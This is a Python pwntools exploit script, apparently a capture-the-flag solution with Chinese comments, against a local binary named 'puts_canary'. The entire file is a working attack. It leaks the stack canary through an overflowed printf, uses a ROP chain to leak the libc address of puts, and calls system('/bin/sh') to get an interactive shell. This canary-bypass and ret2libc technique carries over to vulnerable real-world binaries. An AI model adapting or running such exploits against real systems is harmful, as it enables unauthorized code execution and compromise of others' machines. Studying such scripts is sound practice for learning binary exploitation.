from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./puts_canary')
elf = ELF('./puts_canary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# gdb.attach(p,'b *0x401279')
# 由于canary最后两位是00，所以要写8个覆盖最后的00
payload1 = b'a'*9
p.sendafter(b'name?\n',payload1)
# 读取printf输出的9个a后读取canary
p.recvuntil(b'a'*9)
canary = u64(p.recv(7).rjust(8,b'\x00'))
p.success("canary --> 0x%x" % canary) #输出canary对比

# 第二个read打libc先获取函数地址
rdi = 0x401323
ret = 0x40101a
payload2 = b'a'*8 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
p.sendafter(b'>>\n',payload2)
# 计算基地址
puts_address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
p.success("puts_address --> 0x%x" % puts_address)
libc_base = puts_address - libc.sym['puts']
p.success("libc_base --> 0x%x" % libc_base)
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

# 由于再调用了一次vuln函数所以要再获取一次canary
payload3 = b'a'*9
p.sendafter(b'name?\n',payload3)
# 读取printf输出的9个a后读取canary
p.recvuntil(b'a'*9)
canary2 = u64(p.recv(7).rjust(8,b'\x00'))
p.success("canary2 --> 0x%x" % canary2) #输出canary对比

# 继续打libc
paylaod4 = b'a'*8 + p64(canary2) + p64(0) + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)
p.sendafter(b'>>\n',paylaod4)  
# pause()
p.interactive()